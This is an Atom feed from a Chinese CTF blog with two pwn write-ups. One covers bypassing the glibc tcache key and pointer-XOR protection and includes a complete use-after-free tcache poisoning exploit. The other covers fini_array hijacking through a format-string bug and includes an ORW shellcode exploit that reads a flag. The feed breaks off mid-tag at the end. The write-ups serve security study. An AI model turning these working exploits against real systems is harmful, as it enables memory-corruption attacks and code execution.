<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>🤣Thir0th的喵喵杂货铺🤣</title>
  
  
  <link href="https://www.thir0th.xyz/atom.xml" rel="self"/>
  
  <link href="https://www.thir0th.xyz/"/>
  <updated>2025-04-19T16:29:12.218Z</updated>
  <id>https://www.thir0th.xyz/</id>
  
  <author>
    <name>Thir0th</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2.34的key异或绕过</title>
    <link href="https://www.thir0th.xyz/posts/f484160.html"/>
    <id>https://www.thir0th.xyz/posts/f484160.html</id>
    <published>2025-04-19T16:28:22.000Z</published>
    <updated>2025-04-19T16:29:12.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2-34的key异或绕过"><a href="#2-34的key异或绕过" class="headerlink" title="2.34的key异或绕过"></a>2.34的key异或绕过</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731408768499-51dea875-b6af-410f-84b3-cd651d6913ec.png" alt=""></p><p>2.34引入</p><p>当tcachebin中</p><p>只有一个堆块的时候，key在堆块的fd位</p><p>如果有多个的话，key在tcachebin尾堆块的fd位，因为之前的fd会被加密，因为tcachebin堆指针异或加密</p><h3 id="tcache-key-校验机制"><a href="#tcache-key-校验机制" class="headerlink" title="tcache key 校验机制"></a><font style="color:rgb(51, 51, 51);">tcache key 校验机制</font></h3><font style="color:rgb(51, 51, 51);">此处以libc-2.29源码文件malloc.c来进行机制介绍</font><font style="color:rgb(51, 51, 51);">tcache的分配位于__libc_malloc函数，相关代码：</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="line">  size_t tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><font style="color:rgb(51, 51, 51);">此处tbytes是请求的chunk大小，tc_idx是对应保存tcache链表数组的索引，申请操作中进行了一个检查：检查目标链表是不是空的，不是空的就分配</font><font style="color:rgb(51, 51, 51);">tcache的释放位于_int_free函数，相关代码：</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">    /* Check to see if it&#x27;s already in the tcache.  */</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    /* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="line">       trust it (it also matches random payload data at a 1 in</span><br><span class="line">       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="line">       coincidence before aborting.  */</span><br><span class="line">    if (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="line">        for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">          if (tmp == e)</span><br><span class="line">        malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="line">        /* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="line">           few cycles, but don&#x27;t abort.  */</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><font style="color:rgb(51, 51, 51);">先判断e->key是不是tcache，是的话，就进入一个循环，遍历该chunk所在链表所有的chunk判断是否与释放的chunk地址一致，一致则相同</font><font style="color:rgb(51, 51, 51);">关于e->key为什么会是tcache，在tcache_put函数中有体现：</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><font style="color:rgb(51, 51, 51);">该版本中，释放的chunk会将tcache写入key字段中，然后就是链表头插节点，数量加一</font><h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a><font style="color:rgb(51, 51, 51);">绕过分析</font></h3><font style="color:rgb(51, 51, 51);">key校验机制的关键点有2个：校验key值，是否等于tcache结构体地址</font><ul><li><font style="color:rgb(51, 51, 51);">不等于的话，就直接正常释放</font></li><li><font style="color:rgb(51, 51, 51);">等于的话，</font>**<font style="color:rgb(51, 51, 51);">遍历对应大小的链表</font>**<font style="color:rgb(51, 51, 51);">检查是否存在Double-Free</font></li></ul><font style="color:rgb(51, 51, 51);">常规的绕过key机制的方式是修改key字段，常见通过Overflow或者UAF或者泄露来完成</font><font style="color:rgb(51, 51, 51);">heap_addr=key<<12</font><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a><font style="color:rgb(51, 51, 51);">绕过方法</font></h3><h4 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h4><p>当存在uaf的时候，我们可以直接泄露key，就可以绕过</p><p>修改fd位：xor_free_hook=free_hook^key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p>例题</p><p>flag被读入0x4060，并给出pie_base</p><p>add,edit,show,free四个功能函数</p><p>2.35版本，uaf</p><p>uaf泄露出key之后tcachebin attack 将flag堆块申请出来，show就可以得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410367915-aae1ee10-12f0-4e23-ae52-ecfdb3fe86ae.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1731410389619-0bc1b17a-3938-4338-a614-d6281c944a5b.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pie_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1a44</span></span><br><span class="line">li(<span class="built_in">hex</span>(pie_base))</span><br><span class="line">flag=pie_base+<span class="number">0x4060</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">rl(<span class="string">&quot;input size&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">i,content</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(i))</span><br><span class="line">rl(<span class="string">&quot;input data&gt;&gt;&quot;</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">i</span>):</span><br><span class="line">rl(<span class="string">&quot;5.exit&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">rl(<span class="string">&quot;input index&gt;&gt;&quot;</span>)</span><br><span class="line">s(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">rl(<span class="string">&quot;data&gt;&gt;\n&quot;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="built_in">hex</span>(key))</span><br><span class="line">heap_base=(key&lt;&lt;<span class="number">12</span>)-<span class="number">0x1000</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">flag_xor=flag^key</span><br><span class="line">edit(<span class="number">0</span>,p64(flag_xor-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="House-of-Karui"><a href="#House-of-Karui" class="headerlink" title="House of Karui"></a><font style="color:rgb(34, 34, 38);">House of Karui</font></h4><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/142422852">【我的 PWN 学习手札】House of Karui —— tcache key 绕过_tcache key怎么找-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">2.34的key异或绕过</summary>
    
    
    
    <category term="chunk" scheme="https://www.thir0th.xyz/categories/chunk/"/>
    
    
    <category term="pwn" scheme="https://www.thir0th.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>fini_array劫持</title>
    <link href="https://www.thir0th.xyz/posts/6db984ee.html"/>
    <id>https://www.thir0th.xyz/posts/6db984ee.html</id>
    <published>2025-04-19T16:18:35.000Z</published>
    <updated>2025-04-19T16:18:39.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="非栈上fmt劫持"><a href="#非栈上fmt劫持" class="headerlink" title="非栈上fmt劫持"></a>非栈上fmt劫持</h1><p><a href="https://www.cnblogs.com/seyedog/p/17891490.html">https://www.cnblogs.com/seyedog/p/17891490.html</a></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>程序执行流程图：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713479270-56b817f8-817e-4336-8cfc-fb463d07ff76.png" alt=""></p><p>函数最终exit退出时会调用fini_array函数，如果可以控制fini_array，就可以劫持程序流程</p><p>dl_fini函数</p><p>main-&gt;exit-&gt;<strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">__run_exit_handlers-&gt;dl_fini</font></strong></p><p><strong><font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">dl_fini函数中会调用call rax</font></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713632424-eb86c69d-1e65-4f80-9900-29dcc570b6d2.png" alt=""></p><p>我们可以控制l_addr，浅紫色为残存下来的l_addr地址，我们可以利用fmt去修改这个数值,劫持程序返回到tar_addr</p><p>偏移计算：偏移=tar_addr-fini_arry_addr</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714211462-96e208c7-58cc-4585-b1d7-783926810183.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713703387-c634b302-5b6f-49d0-80a2-e0d1acf6cde7.png" alt=""></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>2023金盾杯的一道题</p><p>这里有close(1)，没办法输出，这样我们偏移就不好找，同时开启沙盒，只有一次非栈上fmt</p><p>思路：直接用到fini_array劫持，<font style="color:rgb(34, 34, 34);">通过修改dl_fini数组里的偏移值，使函数在退出时执行我们写在bss段上的shellcode</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726382942358-8ae4fc44-76b3-43d2-b127-440e1a7796b5.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726713136255-e1963cea-ee23-4e3d-8647-cb61f1d88020.png" alt=""></p><p>我们可以将close(1) 修掉，nop掉</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714408563-9e64ff30-ca94-4dc3-8fea-82f55aa9114b.png" alt=""></p><p>完成：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714480116-3a82770d-a9df-4543-b4fa-23118d0347d2.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714489260-968affba-4ab2-4af7-95a2-c0f3e134fa7b.png" alt=""></p><p>保存</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1726714515960-fde24aba-0ecd-4a5a-82d2-8e6e2fdc83e2.png" alt=""></p><p>偏移计算</p><p>偏移=shellcode_addr-fini_addr</p><font style="color:rgb(34, 34, 34);">0x40406B - 0x403D98 = 723</font><font style="color:rgb(34, 34, 34);">修改的同时读入orw shellcode</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">bss=0x404060</span><br><span class="line">shellcode  =asm(shellcraft.open(&quot;/flag&quot;))</span><br><span class="line">shellcode +=asm(shellcraft.read(3,bss+0x50,0x100))</span><br><span class="line">shellcode +=asm(shellcraft.write(2,bss+0x50,0x100))</span><br><span class="line">pay=asm(&#x27;&#x27;&#x27;    </span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    push SYS_openat</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, 3</span><br><span class="line">    push 0</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov r10, 0x100</span><br><span class="line">    push SYS_sendfile</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Let&#x27;s start!&quot;)</span><br><span class="line">payload=b&#x27;%723c%30$hn&#x27;+p64(0x40406b+8)+pay</span><br><span class="line">pr(hex(len(payload)))</span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><font style="color:rgb(34, 34, 34);"></font><h1 id="栈上fmt劫持"><a href="#栈上fmt劫持" 